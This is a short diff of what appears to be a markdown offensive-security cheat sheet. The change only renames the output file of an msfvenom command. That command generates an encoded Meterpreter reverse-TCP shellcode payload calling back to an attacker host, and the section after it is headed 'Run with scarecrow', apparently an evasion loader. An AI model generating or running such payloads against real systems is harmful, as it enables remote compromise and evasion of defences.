@@ -93,7 +93,7 @@ gc <FILE> -Stream Zone.Identifier
 
 #### Generate shellcode
 ```
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -i 11 -f raw -o hackerman.bin
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -i 11 -f raw -o shellcode.bin
 ```
 
 #### Run with scarecrow
